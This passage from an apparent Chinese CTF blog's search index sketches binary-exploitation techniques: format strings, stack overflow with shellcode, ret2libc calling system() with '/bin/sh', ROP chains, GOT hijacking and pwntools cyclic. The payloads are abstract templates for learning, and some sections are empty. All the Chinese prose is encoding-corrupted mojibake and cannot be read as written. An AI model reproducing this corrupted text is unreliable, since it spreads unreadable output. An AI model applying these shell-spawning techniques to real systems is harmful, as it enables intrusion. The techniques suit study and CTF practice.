è€Œå…¶ä»–æ ¼å¼åŒ–å­—ç¬¦ä¸²å‚æ•°å¯ç”¨äºè¯»å–ä¿¡æ¯æˆ–é…åˆ%nå†™æ•°æ®ã€‚</code></pre><p><strong>æ¼æ´åˆ©ç”¨</strong></p><h2 id="æ ˆæº¢å‡º"><a href="#æ ˆæº¢å‡º" class="headerlink" title="æ ˆæº¢å‡º"></a>æ ˆæº¢å‡º</h2><p><strong>åŸç†ï¼š</strong>è®© eip è½½å…¥æ”»å‡»æŒ‡ä»¤çš„åœ°å€</p><h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p><strong>å‰æï¼š</strong>åœ¨å‡½æ•°è°ƒç”¨æ ˆä¸Šçš„æ•°æ®ï¼ˆshellcodeï¼‰è¦æœ‰å¯æ‰§è¡Œçš„æƒé™ï¼Œå¹¶ä¸”å…³é—­å†…å­˜å¸ƒå±€éšæœºåŒ–</p><p><strong>åŸç†ï¼š</strong>ä¿®æ”¹è¿”å›åœ°å€ï¼Œè®©å…¶æŒ‡å‘æº¢å‡ºæ•°æ®ä¸­çš„ä¸€æ®µæŒ‡ä»¤</p><pre><code>payload : padding1 + address of shellcode + padding2 + shellcode</code></pre><p><strong>å…·ä½“ç»†èŠ‚ï¼š</strong></p><p>**padding1:**ä»£è¡¨å‡½æ•°å‚æ•°ï¼Œé€†åºè¿›å…¥æ ˆä¸­ï¼Œå¯ä»¥éšæ„å¡«å……,é•¿åº¦åº”è¯¥åˆšå¥½è¦†ç›–å‡½æ•°çš„åŸºåœ°å€</p><p><strong>è·å–é•¿åº¦æ–¹æ³•ï¼š</strong>1.æŸ¥çœ‹æ±‡ç¼–ä»£ç  2.è¿è¡Œç¨‹åºæ—¶ç”¨ä¸æ–­å¢åŠ è¾“å…¥é•¿åº¦çš„æ–¹æ³•æ¥è¯•æ¢</p><p>**address of shellcode:**shellcode èµ·å§‹å¤„çš„åœ°å€ï¼Œç”¨æ¥è¦†ç›–è¿”å›åœ°å€</p><p><strong>padding2ï¼š</strong>å¯ä»¥éšæ„å¡«å……ï¼Œé•¿åº¦å¯ä»¥ä»»æ„</p><p>**shellcode:**åº”ä¸ºåå…­è¿›åˆ¶çš„æœºå™¨ç æ ¼å¼</p><p><img src="/2019/07/22/pwn-base/1.png"></p><h3 id="Return2libc"><a href="#Return2libc" class="headerlink" title="Return2libc"></a>Return2libc</h3><p><strong>å‰æï¼š</strong>æ“ä½œç³»ç»Ÿå…³é—­å†…å­˜å¸ƒå±€éšæœºåŒ–ï¼ˆASLRï¼‰ï¼Œè€Œä¸” shellcode è¿˜éœ€è¦ç¨‹åºè°ƒç”¨æ ˆæœ‰å¯æ‰§è¡Œæƒé™</p><p>**åŸç†:**ä¿®æ”¹è¿”å›åœ°å€ï¼Œè®©å…¶æŒ‡å‘å†…å­˜ä¸­å·²æœ‰çš„æŸä¸ªå‡½æ•°</p><pre><code>payload: padding1 + address of system() + padding2 + address of â€œ/bin/shâ€</code></pre><p><strong>å…·ä½“ç»†èŠ‚ï¼š</strong></p><p><strong>address of system()ï¼š</strong>æ˜¯ system() åœ¨å†…å­˜ä¸­çš„åœ°å€ï¼Œç”¨æ¥è¦†ç›–è¿”å›åœ°å€</p><p>ç¨‹åºæ˜¯å¦‚ä½•è°ƒç”¨åŠ¨æ€é“¾æ¥åº“ä¸­çš„å‡½æ•°çš„è¿‡ç¨‹ï¼š</p><p>å½“å‡½æ•°è¢«åŠ¨æ€é“¾æ¥è‡³ç¨‹åºä¸­ï¼Œç¨‹åºåœ¨è¿è¡Œæ—¶é¦–å…ˆç¡®å®šåŠ¨æ€é“¾æ¥åº“åœ¨å†…å­˜çš„èµ·å§‹åœ°å€ï¼Œå†åŠ ä¸Šå‡½æ•°åœ¨åŠ¨æ€åº“ä¸­çš„ç›¸å¯¹åç§»é‡ï¼Œæœ€ç»ˆå¾—åˆ°å‡½æ•°åœ¨å†…å­˜çš„ç»å¯¹åœ°å€</p><p><strong>padding2ï¼š</strong>è¯¥å¤„çš„æ•°æ®é•¿åº¦ä¸º4ï¼ˆ32ä½æœºï¼‰ï¼Œå¯¹åº”è°ƒç”¨ system() æ—¶çš„è¿”å›åœ°å€</p><p><strong>address of â€œ/bin/shâ€ï¼š</strong>æ˜¯å­—ç¬¦ä¸² â€œ/bin/shâ€ åœ¨å†…å­˜ä¸­çš„åœ°å€ï¼Œä½œä¸ºä¼ ç»™ system() çš„å‚æ•°ã€‚</p><p><img src="/2019/07/22/pwn-base/v2-4523795fdf150416d91e4e4adc0ef0ae_hd.png"></p><h3 id="ROP-Return-Oriented-Programming"><a href="#ROP-Return-Oriented-Programming" class="headerlink" title="ROP ( Return Oriented Programming )"></a>ROP ( Return Oriented Programming )</h3><p><strong>å‰æï¼š</strong></p><p><strong>åŸç†ï¼š</strong>ä¿®æ”¹è¿”å›åœ°å€ï¼Œè®©å…¶æŒ‡å‘å†…å­˜ä¸­å·²æœ‰çš„ä¸€æ®µæŒ‡ä»¤</p><pre><code>payload1 : padding + address of gadgetpayload2 : padding + address of gadget 1 + address of gadget 2 + ...... + address of gadget n</code></pre><p><strong>å…·ä½“ç»†èŠ‚ï¼š</strong></p><h3 id="Hijack-GOT"><a href="#Hijack-GOT" class="headerlink" title="Hijack GOT"></a>Hijack GOT</h3><p><strong>å‰æï¼š</strong></p><p><strong>åŸç†ï¼š</strong>ä¿®æ”¹æŸä¸ªè¢«è°ƒç”¨å‡½æ•°çš„åœ°å€ï¼Œè®©å…¶æŒ‡å‘å¦ä¸€ä¸ªå‡½æ•°</p><p><img src="/2019/07/22/pwn-base/v2-e53f1d43a7191e3ea6922bea253bccbe_hd.png"></p><p><strong>å…·ä½“ç»†èŠ‚ï¼š</strong></p><h2 id="ä¸€äº›å·¥å…·çš„ä½¿ç”¨"><a href="#ä¸€äº›å·¥å…·çš„ä½¿ç”¨" class="headerlink" title="ä¸€äº›å·¥å…·çš„ä½¿ç”¨"></a>ä¸€äº›å·¥å…·çš„ä½¿ç”¨</h2><h3 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h3><h3 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h3><h3 id="Cyclicçš„ä½¿ç”¨"><a href="#Cyclicçš„ä½¿ç”¨" class="headerlink" title="Cyclicçš„ä½¿ç”¨"></a>Cyclicçš„ä½¿ç”¨</h3><p><strong>ç®€ä»‹ï¼š</strong>Cyclic patternæ˜¯ä¸€ä¸ªå¾ˆå¼ºå¤§çš„åŠŸèƒ½ï¼Œå¤§æ¦‚æ„æ€å°±æ˜¯ï¼Œä½¿ç”¨pwntoolsç”Ÿæˆä¸€ä¸ªpatternï¼Œpatternå°±æ˜¯æŒ‡ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¯ä»¥é€šè¿‡å…¶ä¸­çš„ä¸€éƒ¨åˆ†æ•°æ®å»å®šä½åˆ°ä»–åœ¨ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­çš„ä½ç½®ã€‚</p><p><strong>å‘½ä»¤ï¼š</strong></p><pre><code>cyclic 100   ç”¨æ¥ç”Ÿæˆä¸€ä¸ªç‰¹æ®Šçš„å­—ç¬¦ä¸²ï¼Œéšæ„å–éƒ½ä¸é‡å¤cyclic -l å­—ç¬¦ä¸²    æŸ¥æ‰¾å­—ç¬¦ä¸²ä½ç½®</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
            <tag> äºŒè¿›åˆ¶ </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
